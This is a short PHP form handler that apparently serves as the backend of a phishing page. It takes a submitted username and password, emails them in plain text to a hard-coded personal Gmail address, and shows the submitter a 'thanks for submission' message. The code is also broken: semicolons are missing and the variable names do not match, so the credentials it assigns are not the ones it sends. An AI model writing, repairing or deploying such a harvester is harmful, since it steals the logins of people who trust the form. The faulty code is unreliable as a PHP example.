<?php
$username=$_POST['username']
$passwords=$_POST['password']

$to='taliatibrahim457@gmail.com';
$subject='Form submission';
$message="name:$name\npassword:$password";

$success=mail($to,$subject,$message);
if($success){
    echo'thanks for submission';
}else{
    echo'error sending mail'
}
?>